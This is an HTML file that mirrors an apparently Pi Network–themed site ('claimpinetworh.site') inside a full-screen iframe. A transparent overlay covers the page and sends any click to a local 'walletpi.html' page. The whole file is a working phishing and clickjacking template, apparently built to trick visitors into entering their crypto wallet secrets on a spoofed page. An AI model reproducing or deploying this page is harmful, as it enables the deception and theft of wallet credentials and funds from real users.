<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mirrored Page with Redirect</title>
    <style>
        /* Ensure the body and html elements cover the full height and width */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden; /* Prevent scrolling of the parent document */
        }
        .container {
            position: relative;
            width: 100%;
            height: 100%;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none; /* Remove default border */
            overflow: auto; /* Ensure scrolling inside the iframe */
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0); /* Transparent overlay */
            pointer-events: auto; /* Capture all click events */
            z-index: 10; /* Ensure it is on top of the iframe */
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Replace 'https://example.com' with the URL of the page you want to mirror -->
        <iframe src="https://www.claimpinetworh.site/pibrower" scrolling="yes"></iframe>
        <div class="overlay" id="redirect-overlay"></div> <!-- Transparent overlay to capture clicks -->
    </div>

    <script>
        // URL to redirect to when the overlay is clicked
        const redirectUrl = 'walletpi.html';

        document.getElementById('redirect-overlay').addEventListener('click', function() {
            window.location.href = redirectUrl;
        });
    </script>
</body>
</html>
